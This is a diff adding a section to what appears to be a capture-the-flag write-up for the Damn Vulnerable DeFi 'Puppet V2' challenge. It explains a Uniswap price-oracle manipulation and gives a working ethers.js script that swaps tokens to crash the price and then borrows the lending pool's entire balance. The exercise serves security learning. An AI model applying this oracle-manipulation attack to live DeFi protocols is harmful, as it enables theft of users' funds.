@@ -225,3 +225,38 @@ await this.lendingPool.connect(attacker).borrow(
     {value: await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)}
 );
 ```
+
+9. Puppet V2
+
+This is the continuation of the last challenge. The only difference is the pool get its price oracle from a liquidity pool on Uniswap. To solve this challenge, I can implement my original guess for the last challenge - oracle manipulation. To do so, we can use swap our token to receive ETH to drive down the price of the token. After the swap, if the return value of `calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)` is smaller than the ETH balance of attacker's contract, then we can convert ETH into WETH and burrow all of the token from the lending pool.    
+
+Attack can be carried out as follows:
+```
+// approve the uniswap router for swap
+await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+// swap to change the pool dynamic
+await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+    ATTACKER_INITIAL_TOKEN_BALANCE,
+    0, 
+    [this.token.address, this.weth.address],
+    attacker.address,
+    (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+);
+
+// calculate amount of WETH needed to deposit for getting all of the token in the pool
+let collateralInETH = await this.lendingPool.connect(attacker).calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+// get balance of ETH after the swap and compare if there's enough ETH to get all of the token in the pool
+let etherBal = await ethers.provider.getBalance(attacker.address);
+etherBal > collateralInETH ? NaN : console.log("Not enough ETH to meet deposit of WETH required")
+
+// wrap the ETH
+await this.weth.connect(attacker).deposit({value: collateralInETH});
+
+// approve the lending pool
+await this.weth.connect(attacker).approve(this.lendingPool.address, collateralInETH);
+
+// get all of the token in the poool
+await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE); 
+```
